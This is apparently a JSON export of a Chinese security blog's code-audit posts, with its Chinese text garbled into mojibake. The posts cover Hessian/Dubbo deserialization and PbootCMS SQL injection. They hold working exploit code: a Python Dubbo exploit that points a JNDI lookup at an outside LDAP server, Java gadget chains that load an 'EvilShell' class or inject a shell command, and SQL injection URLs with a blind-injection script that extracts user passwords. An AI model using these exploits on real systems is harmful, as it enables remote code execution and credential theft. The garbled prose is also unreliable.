Object readObject(AbstractHessianInput in, String type, String[] fieldNames) throws HessianProtocolException, IOException &#123; Deserializer deserializer = this.getDeserializer(type);//deserializer._typeä¸ºClass Person if (deserializer != null) &#123; return deserializer.readObject(in, fieldNames);//è·Ÿè¿› public Deserializer getDeserializer(String type) throws HessianProtocolException &#123; if (type != null &amp;&amp; !type.equals(&quot;&quot;) &amp;&amp; !this._typeNotFoundDeserializerMap.containsKey(type)) &#123; ... Deserializer deserializer = (Deserializer)_staticTypeMap.get(type);//åŸºæœ¬æ•°æ®ç±»å‹åŠå…¶æ•°ç»„ ... try &#123; Class cl = this.loadSerializedClass(type); deserializer = this.getDeserializer(cl); public Class&lt;?&gt; loadSerializedClass(String className) throws ClassNotFoundException &#123; return this.getClassFactory().load(className);//appclassloader &#125; public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123; if (this.isAllow(className)) &#123;//é»‘åå• return Class.forName(className, false, this._loader);//Class.forNameç±»åŠ è½½//false,æ²¡æœ‰åˆå§‹åŒ– &#125; else &#123; log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class;//ä¸å­˜åœ¨æˆ–åœ¨é»‘åå•é‡Œåˆ™è¿”å›HashMap &#125; &#125; com\\alibaba\\com\\caucho\\hessian\\io\\JavaDeserializer.class public Object readObject(AbstractHessianInput in, String[] fieldNames) throws IOException &#123; try &#123; Object obj = this.instantiate();//ç±»åˆå§‹åŒ– return this.readObject(in, obj, fieldNames); public Object readObject(AbstractHessianInput in, Object obj, String[] fieldNames) throws IOException &#123; try &#123; int ref = in.addRef(obj); for(int i = 0; i &lt; fieldNames.length; ++i) &#123; String name = fieldNames[i]; JavaDeserializer.FieldDeserializer deser = (JavaDeserializer.FieldDeserializer)this._fieldMap.get(name);//è·å–å±æ€§ if (deser != null) &#123; deser.deserialize(in, obj);//è·Ÿè¿› &#125; else &#123; in.readObject(); &#125; &#125; void deserialize(AbstractHessianInput in, Object obj) throws IOException &#123; String value = null; try &#123; value = in.readString(); this._field.set(obj, value);//åå°„è®¾ç½®å±æ€§ &#125; catch (Exception var5) &#123; JavaDeserializer.logDeserializeError(this._field, obj, value, var5); &#125; &#125; protected Object instantiate() throws Exception &#123; try &#123; return this._constructor != null ? this._constructor.newInstance(this._constructorArgs) : this._type.newInstance();//this._type.newInstance() ç±»åˆå§‹åŒ– hashmapååºåˆ—åŒ– protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123; Deserializer keyDeserializer = null; Deserializer valueDeserializer = null; SerializerFactory factory = this.findSerializerFactory(in); if (keyType != null) &#123; keyDeserializer = factory.getDeserializer(keyType.getName()); &#125; if (valueType != null) &#123; valueDeserializer = factory.getDeserializer(valueType.getName()); &#125; while(!in.isEnd()) &#123; map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject()); &#125; &#125; expéœ€è¦å¯ç”¨æ€§ï¼ŒwiresharkæŠ“åŒ…å¤ªéº»çƒ¦äº†ï¼Œï¼Œ python# pip3 install dubbo-py import socket import binascii import re import time from dubbo.codec.hessian2 import Decoder, new_object from dubbo.client import DubboClient def exp1(ip,port): client = DubboClient(ip,port) JdbcRowSetImpl = new_object( &#39;com.sun.rowset.JdbcRowSetImpl&#39;, dataSource=&quot;ldap://150.158.172.182:1389/o=reference&quot;, strMatchColumns=[&quot;foo&quot;] ) JdbcRowSetImplClass = new_object( &#39;java.lang.Class&#39;, name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;, ) toStringBean = new_object( &#39;com.rometools.rome.feed.impl.ToStringBean&#39;, beanClass=JdbcRowSetImplClass, obj=JdbcRowSetImpl ) # print(toStringBean) # exit() resp = client.send_request_and_return_response( service_name=&#39;cn.rui0&#39;, method_name=&#39;any&#39;,#&lt;=2.7.5 # service_name=&#39;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#39;, # method_name=&#39;rceTest&#39;, # service_version=&#39;1.0.0&#39;, args=[toStringBean]) print(resp) res = str(resp) notfound = &quot;ClassNotFoundException: com.rometools.rome.feed.impl.ToStringBean&quot; fix = &quot;arguments=[]&quot; if notfound in res: print(&quot;notfound depend&quot;) elif fix in res: print(&quot;already fix&quot;) else: print(&quot;success&quot;) ip=&#39;127.0.0.1&#39; port = 20880 exp1(ip,port) javahttps://github.com/lz2y/DubboPOC å‚è€ƒå¹¶è¿›è¡Œä¿®æ”¹ï¼Œï¼Œï¼Œ dubboå’Œhessionçš„ä¸åŒç±»åˆå§‹åŒ–ä¸åŒåŸç”Ÿhessionä½¿ç”¨äº†Unsafeå¯ä»¥ä½¿ç”¨åˆå§‹åŒ–ä»»æ„ç±» dubboé€šè¿‡æ„é€ å‡½æ•°åˆå§‹åŒ–ï¼Œå‚æ•°é»˜è®¤nullï¼Œéƒ¨åˆ†æ„é€ å‡½æ•°ä½¿ç”¨åˆ°å‚æ•°å¯èƒ½ä¼šæŠ¥é”™é€€å‡º//å¦‚SignedObject åŸç”ŸreadObjectå’Œæ„é€ å‡½æ•°æ— å…³ï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡ä¸€ä¸‹é»‘åå• dubbo hession case 111: ref = tag - 96; if (this._classDefs == null) &#123; throw this.error(&quot;No classes defined at reference &#39;&#123;0&#125;&#39;&quot; + tag); &#125; def = (Hessian2Input.ObjectDefinition)this._classDefs.get(ref); return this.readObjectInstance((Class)null, def); private Object readObjectInstance(Class cl, Hessian2Input.ObjectDefinition def) throws IOException &#123; String type = def.getType(); String[] fieldNames = def.getFieldNames(); if (cl != null) &#123;//cl=null Deserializer reader = this.findSerializerFactory().getObjectDeserializer(type, cl); return reader.readObject(this, fieldNames); &#125; else &#123; return this.findSerializerFactory().readObject(this, type, fieldNames);//dubboé»˜è®¤ä½¿ç”¨this.findSerializerFactory() &#125; &#125; com\\alibaba\\com\\caucho\\hessian\\io\\SerializerFactory.class public Object readObject(AbstractHessianInput in, String type, String[] fieldNames) throws HessianProtocolException, IOException &#123; Deserializer deserializer = this.getDeserializer(type); if (deserializer != null) &#123; return deserializer.readObject(in, fieldNames); &#125; ... com\\alibaba\\com\\caucho\\hessian\\io\\JavaDeserializer.class public Object readObject(AbstractHessianInput in, String[] fieldNames) throws IOException &#123; try &#123; Object obj = this.instantiate(); protected Object instantiate() throws Exception &#123; try &#123; return this._constructor != null ? this._constructor.newInstance(this._constructorArgs) : this._type.newInstance(); &#125; catch (Exception var2) &#123; throw new HessianProtocolException(&quot;&#39;&quot; + this._type.getName() + &quot;&#39; could not be instantiated&quot;, var2); &#125;//SignedObjectæ„é€ å‡½æ•°å‚æ•°ä¸ºnew Object[3],å³ä¸‰ä¸ªnullæ—¶ï¼Œthis.sign(signingKey, signingEngine);æŠ¥é”™é€€å‡º &#125; åŸç”Ÿhession case 111: ref = tag - 96; if (this._classDefs.size() &lt;= ref) &#123; throw this.error(&quot;No classes defined at reference &#39;&quot; + Integer.toHexString(tag) + &quot;&#39;&quot;); &#125; def = (Hessian2Input.ObjectDefinition)this._classDefs.get(ref); return this.readObjectInstance((Class)null, def); private Object readObjectInstance(Class&lt;?&gt; cl, Hessian2Input.ObjectDefinition def) throws IOException &#123; String type = def.getType(); Deserializer reader = def.getReader(); Object[] fields = def.getFields(); SerializerFactory factory = this.findSerializerFactory(); if (cl != reader.getType() &amp;&amp; cl != null) &#123;//cl=null reader = factory.getObjectDeserializer(type, cl); return reader.readObject(this, def.getFieldNames()); &#125; else &#123; return reader.readObject(this, fields);//hessionä½¿ç”¨reader &#125; &#125; com\\caucho\\hessian\\io\\UnsafeDeserializer.class private static Unsafe _unsafe; static &#123; boolean isEnabled = false; try &#123; Class&lt;?&gt; unsafe = Class.forName(&quot;sun.misc.Unsafe&quot;); Field theUnsafe = null; Field[] arr$ = unsafe.getDeclaredFields(); int len$ = arr$.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; Field field = arr$[i$]; if (field.getName().equals(&quot;theUnsafe&quot;)) &#123; theUnsafe = field; &#125; &#125; if (theUnsafe != null) &#123; theUnsafe.setAccessible(true); _unsafe = (Unsafe)theUnsafe.get((Object)null); &#125; isEnabled = _unsafe != null; String unsafeProp = System.getProperty(&quot;com.caucho.hessian.unsafe&quot;); if (&quot;false&quot;.equals(unsafeProp)) &#123; isEnabled = false; &#125; &#125; catch (Throwable var7) &#123; log.log(Level.FINER, var7.toString(), var7); &#125; _isEnabled = isEnabled; &#125; public Object readObject(AbstractHessianInput in, Object[] fields) throws IOException &#123; try &#123; Object obj = this.instantiate(); protected Object instantiate() throws Exception &#123; return _unsafe.allocateInstance(this._type);//åªä¼šä¸ºæˆ‘ä»¬çš„ç±»åˆ†é…å†…å­˜ï¼Œä¸ä¼šè°ƒç”¨æ„é€ å‡½æ•° &#125; è™ç¬¦ezchainhttps://firebasky.github.io/2022/03/22/Codeql-excavate-Java-quadratic-deserialization/ ä¸å‡ºç½‘ åŸç”Ÿhession äºŒæ¬¡ååºåˆ—åŒ–éå†åˆ°getOutputPropertieså‰æŠ¥é”™ private transient ThreadLocal _sdom = new ThreadLocal();//transientä¸”readObjectå†…æ²¡æœ‰èµ‹å€¼ public DOM getStylesheetDOM() &#123; return (DOM)_sdom.get(); &#125; æ”¹æˆTemplates//åªæœ‰getOutputProperties public interface Templates &#123; ToStringBean item = new ToStringBean(Templates.class, templates); package marshalsec; import com.caucho.hessian.io.Hessian2Input; import com.caucho.hessian.io.Hessian2Output; import com.rometools.rome.feed.impl.EqualsBean; import com.rometools.rome.feed.impl.ToStringBean; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import marshalsec.util.Reflections; import javax.xml.transform.Templates; import java.io.*; import java.security.*; import java.util.Base64; import java.util.HashMap; import static marshalsec.util.Reflections.setFieldValue; public class Hession2Double &#123; public static void main(String[] args) throws Exception &#123; byte[] code = ClassPool.getDefault().get(&quot;marshalsec.templates.EvilShell&quot;).toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;abc&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;); ToStringBean item = new ToStringBean(Templates.class, templates); // ToStringBean item = new ToStringBean(clazz, obj); ToStringBean tmp = new ToStringBean(String.class, &quot;&quot;); HashMap attachments = new HashMap(); // æœ¬åœ°è§¦å‘calc,éœ€è¦åå°„ä¿®æ”¹ // EqualsBean root = new EqualsBean(ToStringBean.class, item); EqualsBean root = new EqualsBean(ToStringBean.class, tmp); attachments.put(root, &quot;pwn&quot;); for (Object key : attachments.keySet()) &#123; // System.out.println(key); Reflections.setFieldValue(key, &quot;obj&quot;, item); &#125; KeyPairGenerator keyPairGenerator; keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;); keyPairGenerator.initialize(1024); KeyPair keyPair = keyPairGenerator.genKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); Signature signingEngine = Signature.getInstance(&quot;DSA&quot;); SignedObject signedObject = new SignedObject(attachments, privateKey,signingEngine); // signedObject.getObject(); // HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root); ToStringBean item1 = new ToStringBean(SignedObject.class, signedObject);//hessionä¸èƒ½æ¢å¤ _tfactory EqualsBean root1 = new EqualsBean(ToStringBean.class, tmp); HashMap attachments1 = new HashMap(); attachments1.put(root1, &quot;pwn&quot;); for (Object key : attachments1.keySet()) &#123; // System.out.println(key); Reflections.setFieldValue(key, &quot;obj&quot;, item1); &#125; ByteArrayOutputStream os = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(os); output.writeObject(attachments1); output.getBytesOutputStream().flush(); output.completeMessage(); output.close(); System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); byte[] bytes = os.toByteArray(); ByteArrayInputStream btin = new ByteArrayInputStream(bytes); Hessian2Input input = new Hessian2Input(btin); input.readObject(); &#125; &#125; æ³¨å…¥handlerå†…å­˜é©¬ ç›´æ¥å‘½ä»¤æ‰§è¡Œhession å¯ä»¥ä¸â½¤å®ç°åºåˆ—åŒ–æ¥å£ å¯ä»¥å‚è€ƒ marshalsecçš„å®ç° åœ¨ sun.print.UnixPrintService çš„æ‰€æœ‰getâ½…æ³•éƒ½èƒ½è§¦å‘ï¼Œåˆ«çœ‹è¿™ä¸ªæ˜¯Unixå…¶å®linuxä¹Ÿ æœ‰ï¼Œåœ¨â¾¼ç‰ˆæœ¬è¢«ç§»é™¤(æœ‰å…´è¶£â¾ƒâ¼°è€ƒå¤)ï¼Œåˆ©â½¤â½…å¼å°±æ˜¯ç®€å•å‘½ä»¤æ‹¼æ¥æ‰§â¾ï¼ˆç¼ºç‚¹å°±æ˜¯å¤ªèƒ½å¼¹ äº†ï¼ŒåŸºæœ¬ä¸Šæ¯ä¸ªgetâ½…æ³•éƒ½èƒ½å¼¹ï¼‰ Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class); declaredConstructor.setAccessible(true); ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class, declaredConstructor.newInstance(&quot;;open -na Calculator&quot;)); ObjectBean root = new ObjectBean(ObjectBean.class, delegate); HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root); // ByteArrayOutputStream os = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(os); HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory(); sf.setAllowNonSerializable(true); output.setSerializerFactory(sf); output.writeObject(map); output.getBytesOutputStream().flush(); output.completeMessage(); æ‹¿flagçš„è¯å°±ä¸¤ç§â½…å¼ JavaAgent æ³¨â¼Šå†…å­˜é©¬ï¼Œæˆ–è€…æœ¬æ¥å°±æ˜¯ctf å¦‚ä½•å¿«é€Ÿæ‹¿åˆ©â½¤é“¾ åœ¨è¿™æ¬¡â½èµ›åæˆ‘ç®€å•å­¦ä¹ äº†ä¸‹â½¤tabbyï¼Œé€šè¿‡ä¸‹â¾¯çš„neo4jæŸ¥è¯¢è¯­å¥ï¼Œä¹‹åâ¼ˆâ¼¯æ’æŸ¥ä¸‹ åˆ©â½¤â¼€ï¼š åˆ©â½¤â¼†ï¼š output.close(); System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); 2022ç½‘é¼æ¯é’é¾™ç»„badbeanhttps://jeva.cc/2855.html https://y4er.com/posts/wangdingbei-badbean-hessian2/ 2022 0ctf hessian onlyjdkxstreamååºåˆ—åŒ–é“¾ map.put-&gt;MultiUIDefaults(ç§æœ‰+mapå®ç°ç±» ä¸èƒ½ååºåˆ—åŒ–)æ›¿æ¢ä¸ºcodeqlæ‰¾åˆ°çš„MimeTypeParameterList(toString()é‡Œæœ‰hashtableå±æ€§.get())-&gt;SwingLazyValue.createValue-&gt;ä»»æ„ç±»ä»»æ„é™æ€æ–¹æ³•è°ƒç”¨(ä¸èƒ½æ˜¯å¯¹è±¡è°ƒç”¨é™æ€æ–¹æ³•ï¼Œåå°„åˆ©ç”¨å¯åµŒå¥—ç»•è¿‡) tqlï¼Œï¼Œï¼Œ","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java","slug":"java","permalink":"https://pipimi110.github.io/tags/java/"}],"keywords":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"cmsæ¼æ´3","slug":"cmsæ¼æ´3","date":"2022-03-24T15:05:26.291Z","updated":"2022-03-24T15:11:09.461Z","comments":true,"path":"2022/03/24/cmsæ¼æ´3/","link":"","permalink":"https://pipimi110.github.io/2022/03/24/cms%E6%BC%8F%E6%B4%9E3/","excerpt":"","text":"cmsæ¼æ´3pbootcmsåå° /admin.php é»˜è®¤è´¦å·å¯†ç  admin:123456 sqliteæ•°æ®åº“å¯†ç ä¸º md5(md5(â€œ123456â€)) sqlæ³¨å…¥3.0.4 http://www.hackdig.com/06/hack-377510.htm &lt;= 3.0.5PbootCMS/v305/apps/home/model/ParserModel.php å‚æ•°æ‹¼æ¥(sql sink) æ³¨å…¥ç‚¹1http://wiki.peiqi.tech/wiki/cms/PbootCMS/PbootCMS%20domain%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html http://localhost:60086/PbootCMS/v304/?domain/13%27.html http://127.0.0.1:60086/PbootCMS/v304/?domain/13%27)and%271%27--.html http://127.0.0.1:60086/PbootCMS/v304/?domain/13%27)and%270%27--.html æ³¨å…¥ç‚¹2//æœ‰çš„ç½‘ç«™ç®¡ç†å‘˜å¯èƒ½åˆ é™¤äº†æ³¨å…¥ç‚¹1/PbootCMS/v305/?about_3%27)and(select(username)from(ay_user))--.html é‡åˆ°é—®é¢˜ http://localhost:60086/PbootCMS/v305/?about_3%27)and(1)--.html 200 http://localhost:60086/PbootCMS/v305/?about_3%27)and(select(username)from(&#39;qwe&#39;))--.html æ‰§è¡ŒSQLå‘ç”Ÿé”™è¯¯ï¼é”™è¯¯ï¼šno such table: qwe http://localhost:60086/PbootCMS/v305/?about_3%27)and(select(username)from(ay_user))--.html æ‰§è¡ŒSQLå‘ç”Ÿé”™è¯¯ï¼é”™è¯¯ï¼šnear â€œ3â€: syntax error è°ƒè¯•åå‘ç°æ˜¯_çš„é—®é¢˜ ç®€å•åˆ†æå…¥å£ PbootCMS/v305/apps/home/controller/IndexController.php &#125; elseif ($url_rule_type == 3 &amp;&amp; isset($_SERVER[&quot;QUERY_STRING&quot;]) &amp;&amp; $qs = $_SERVER[&quot;QUERY_STRING&quot;]) &#123; // é‡‡ç”¨ç®€çŸ­ä¼ å‚æ¨¡å¼ parse_str($qs, $output); unset($output[&#39;page&#39;]); // å»é™¤åˆ†é¡µ if ($output &amp;&amp; ! current($output)) &#123; // ç¬¬ä¸€ä¸ªè·¯å¾„å‚æ•°ä¸èƒ½æœ‰å€¼ï¼Œå¦åˆ™éæ ‡å‡†è·¯å¾„å‚æ•° $path = key($output); // ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè·¯å¾„ä¿¡æ¯ï¼Œæ³¨æ„PHPæ•°ç»„ä¼šè‡ªåŠ¨å°†keyç‚¹ç¬¦å·è½¬æ¢ä¸‹åˆ’çº¿ $path = trim($path, &#39;/&#39;); // å»é™¤ä¸¤ç«¯æ–œæ  $url_rule_suffix = substr($this-&gt;config(&#39;url_rule_suffix&#39;), 1); if (preg_match(&#39;/_&#39; . $url_rule_suffix . &#39;$/&#39;, $path) &amp;&amp; (! ! $pos = strripos($path, &#39;_&#39; . $url_rule_suffix))) &#123; $path = substr($path, 0, $pos); // å»æ‰©å±• &#125; $path = explode(&#39;/&#39;, $path); &#125; &#125;... if (isset($path) &amp;&amp; is_array($path)) &#123; // åœ°å€åˆ†éš”ç¬¦ $url_break_char = $this-&gt;config(&#39;url_break_char&#39;) ?: &#39;_&#39;; // åˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ç»„åˆä¿¡æ¯ if (strpos($path[0], $url_break_char)) &#123; //$path[0]ä¸ºabout_3&#39;)and(select(username)from(ay_user))-- //$url_break_charä¸º_ $param = explode($url_break_char, $path[0]); &#125; else &#123; $param[] = $path[0]; &#125; æ ¹æ® $path = explode(&#39;/&#39;, $path);//æ„é€ ä¸€ä¸ªpath[0]ç»•è¿‡ æ”¹æˆä¸‹é¢ç»•è¿‡ /PbootCMS/v304/?about_/3%27)and(select(username)from(ay_user))--.html ä½†æ˜¯éƒ½å˜æˆ404äº†ï¼Œå‘ç°æ‰§è¡Œäº†ä¸åŒçš„sqlï¼Œ if (count($path) &gt; 1) &#123;//æ³¨å…¥ç‚¹2//ä¸ºäº†ç»•è¿‡_ count($path)&gt;1äº† define(&#39;CMS_PAGE&#39;, false); // ä½¿ç”¨æ™®é€šåˆ†é¡µå¤„ç†æ¨¡å‹ if (! ! ($data = $this-&gt;model-&gt;getContent($path[1])) &amp;&amp; ($data-&gt;scode == $scode || $data-&gt;sortfilename == $scode) &amp;&amp; $data-&gt;type == 2) &#123; if ($data-&gt;acode != get_lg() &amp;&amp; Config::get(&#39;lgautosw&#39;) !== &#39;0&#39;) &#123; cookie(&#39;lg&#39;, $data-&gt;acode); // è°ƒç”¨å†…å®¹è¯­è¨€ä¸å½“å‰è¯­è¨€ä¸ä¸€è‡´æ—¶ï¼Œè‡ªåŠ¨åˆ‡æ¢è¯­è¨€ &#125; $this-&gt;getContent($data); &#125; else &#123; _404(&#39;æ‚¨è®¿é—®çš„å†…å®¹ä¸å­˜åœ¨ï¼Œè¯·æ ¸å¯¹åé‡è¯•ï¼&#39;); &#125; &#125; else &#123;//æ³¨å…¥ç‚¹1 å°è¯•æ‰‹åŠ¨ä¿®æ”¹idæµ‹è¯•æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ if (! ! ($data = $this-&gt;model-&gt;getContent($path[1])) &amp;&amp; ($data-&gt;scode == $scode || $data-&gt;sortfilename == $scode) &amp;&amp; $data-&gt;type == 2) &#123; é»˜è®¤æ•°æ®æ”¹æˆä¸‹é¢å¯ä»¥ç”¨ http://localhost:60086/PbootCMS/v305/?about_4/5%27)and(1)--.html ç½‘ç«™ç®¡ç†å‘˜ä¿®æ”¹åçš„å¯ä»¥çˆ†ç ´ä¸€ä¸‹ï¼Œæ»¡è¶³æ¡ä»¶è¿”å›200 GET /?about_Â§4Â§/Â§5Â§%27)and(1)--.html HTTP/1.1 æŸç«™æ‰«äº†ä¸€ä¸‹ exp pbootcms è¿‡æ»¤ç©ºæ ¼ å®æµ‹æœ‰çš„ç«™æœ‰waf #è¿‡æ»¤from(xxx) #è¿‡æ»¤fromxxx #è¿‡æ»¤substr import re from threading import Thread import requests import urllib3 import string urllib3.util.url.FRAGMENT_CHARS |= &#123;&quot;|&quot;, &quot;%&quot;&#125; url = &quot;&quot; bool_flag = 200 proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125; def getres(exp): burp0_url = url+exp+&quot;.html&quot; # r = requests.get(burp0_url, proxies=proxies) r = requests.get(burp0_url) e = &quot;syntax error&quot; if e in r.text: print(r.text) exit(e) return r.status_code def makexp(c,flag): exp = &quot;&#39;)and((&#123;content&#125;)like&#39;&#123;flag&#125;%&#39;)--&quot;.format(content=c,flag=flag) return exp def run(len1, chars, c, flag): for l in range(len1): for x in chars: tmp = flag+x exp = makexp(c, tmp) print(&quot;[-]test: &quot;+x) # print(exp) # print(getres(exp)) if getres(exp) == 200: flag = tmp break # exit() print(&quot;[+]flag: &quot;+flag) if flag != tmp: exit(&quot;[-]not found|over&quot;) c = &quot;sqlite_version()&quot; #è¿‡æ»¤sqlite_version() #è¿‡æ»¤ç©ºæ ¼ #è¿‡æ»¤from(xxx) #è¿‡æ»¤from`xxx` #è¿‡æ»¤substr c = &quot;select(group_concat(password))from&#39;ay_user&#39;&quot; c = &quot;select(group_concat(username))from&#39;ay_user&#39;&quot; chars = &quot;,&quot;+string.ascii_letters+string.digits+&quot;_&quot; len1 = 20 flag = &quot;&quot; run(len1, chars, c, flag)","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php","slug":"php","permalink":"https://pipimi110.github.io/tags/php/"}],"keywords":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://pipimi110.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"dubboååºåˆ—åŒ–æ¼æ´åˆ†æ","slug":"dubboæ¼æ´","date":"2022-03-20T16:15:44.097Z","updated":"2022-04-01T11:15:08.480Z","comments":true,"path":"2022/03/21/dubboæ¼æ´/","link":"","permalink":"https://pipimi110.github.io/2022/03/21/dubbo%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"é™¤äº†å®˜æ–¹æ¨èçš„é»˜è®¤Dubboåè®®å¤–ï¼ŒDubboè¿˜æ”¯æŒHTTPï¼ŒRMIç­‰åè®®ã€‚ providerç›¸å½“äºæœåŠ¡å™¨ï¼Œæ˜¯æˆ‘ä»¬çš„æ”»å‡»ç›®æ ‡ consumerç›¸å½“äºå®¢æˆ·æœºï¼Œä¸æ˜¯æ”»å‡»ç›®æ ‡ å®‰è£… zookeeper å®é™…ä¸Š dubbo-spring-boot-samples æ²¡æœ‰ç”¨åˆ°ï¼Œä¸å®‰è£…ä¹Ÿå¯ä»¥ https://archive.apache.org/dist/zookeeper/zookeeper-3.3.3/zookeeper-3.3.3.tar.gz è§£å‹åçš„æ ¹ç›®å½•ä¸‹æ–°å»ºdataå’Œlogsä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œä¿®æ”¹confç›®å½•ä¸‹çš„zoo_sample.cfgä¸ºzoo.cfgï¼Œè¦†ç›–åŸæœ‰çš„dataDirå¹¶æ·»åŠ dataLogDir dubbo-spring-boot-samples https://codeload.github.com/apache/dubbo-spring-boot-project/zip/refs/tags/2.7.5 application.yml æ”¹ç«¯å£ server: port: 8888 dubbopoc/buddo-demo https://github.com/apache/dubbo-samples/tree/master/dubbo-samples-basic https://github.com/lz2y/DubboPOC æ³¨æ„ æ­¤ç¯å¢ƒéspring-boot æ²¡æœ‰tomcatä¾èµ– dubbo-provider.xml &lt;dubbo:registry address=&quot;zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181&quot;/&gt; éœ€è¦å®‰è£…zookeeper bin\\zkServer.cmd nc 127.0.0.1 20880 dubbo&gt;ls PROVIDER: top.lz2y.service.DemoService dubbo&gt;ls top.lz2y.service.DemoService top.lz2y.service.DemoService (as provider): sayHello CVE-2019-17564//httphttps://www.anquanke.com/post/id/231416#h3-3 2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4 2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7 Apache Dubbo = 2.5.x åœ¨ç”¨æˆ·ä½¿ç”¨HTTPåè®®è¿›è¡Œé€šä¿¡æ—¶ï¼Œä¼šå°†æ¶ˆè´¹è€…è¿œç¨‹çš„requestä¸­POSTçš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œè€Œä¸”Dubboå¯¹äºæ¶ˆæ¯ä½“æœªåšè¿‡æ»¤ç­‰å¤„ç†ï¼Œæ‰€ä»¥é€ æˆäº†è¿™æ¬¡ååºåˆ—åŒ–é—®é¢˜ã€‚ curl CVE-2020-1948https://www.freebuf.com/vuls/287658.html http://rui0.cn/archives/1338 https://xz.aliyun.com/t/7969#toc-2 https://www.cnblogs.com/bitterz/p/15526206.html Apache Dubbo 2.7.0 to 2.7.6 Apache Dubbo 2.6.0 to 2.6.7 Apache Dubbo all 2.5.x versions (å®˜æ–¹å·²ä¸å†æä¾›æ”¯æŒ) åœ¨provider-sampleæ–‡ä»¶å¤¹ä¸‹çš„ pom é‡Œæ·»åŠ  rome ä¾èµ–//å’Œyso romeä¸æ˜¯åŒä¸€ç§ ä¾èµ–&lt;dependency&gt; &lt;groupId&gt;com.rometools&lt;/groupId&gt; &lt;artifactId&gt;rome&lt;/artifactId&gt; &lt;version&gt;1.7.0&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; æ”»å‡»ä¾èµ–äº rome å·¥å…·åŒ…ä¸­çš„ ToStringBean å·¥å…· åˆ†æromeä¾èµ– toString-&gt;jndiæ³¨å…¥ python //dubbo2.7.3pythonç‰ˆæœ¬pocæˆåŠŸè§¦å‘çš„å…³é”®ç‚¹åœ¨äºï¼Œé€šè¿‡æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„service_nameä½¿å¾—æœåŠ¡ç«¯è·å–ä¸åˆ°æœŸæœ›çš„DubboExporterè¿›è€ŒæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œåœ¨è¾“å‡ºå¼‚å¸¸ä¿¡æ¯çš„æ—¶å€™è¿›è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥è¿›è€Œè°ƒç”¨äº†éšå«çš„toStringæ–¹æ³•ï¼Œæ‰€ä»¥èƒ½å¤Ÿé€šè¿‡æ„é€ çš„æ¶æ„å¯¹è±¡çš„toStringæ–¹æ³•è§¦å‘æ¼æ´ sink1//åååºåˆ—åŒ–//é™¤äº†è¯¥exp&lt;=2.7.3ï¼Œå…¶ä»–&lt;=2.7.13 æ²¡æœ‰ä½¿ç”¨hashmapï¼Œåªè§¦å‘ä¸€æ¬¡å‘½ä»¤æ‰§è¡Œ DubboProtocol Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) throws RemotingException &#123; ... DubboExporter&lt;?&gt; exporter = (DubboExporter)this.exporterMap.get(serviceKey); if (exporter == null) &#123; throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + inv); &#125;//è§¦å‘inv.toString() è°ƒç”¨é“¾ getInvoker:264, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo) decodeInvocationArgument:282, 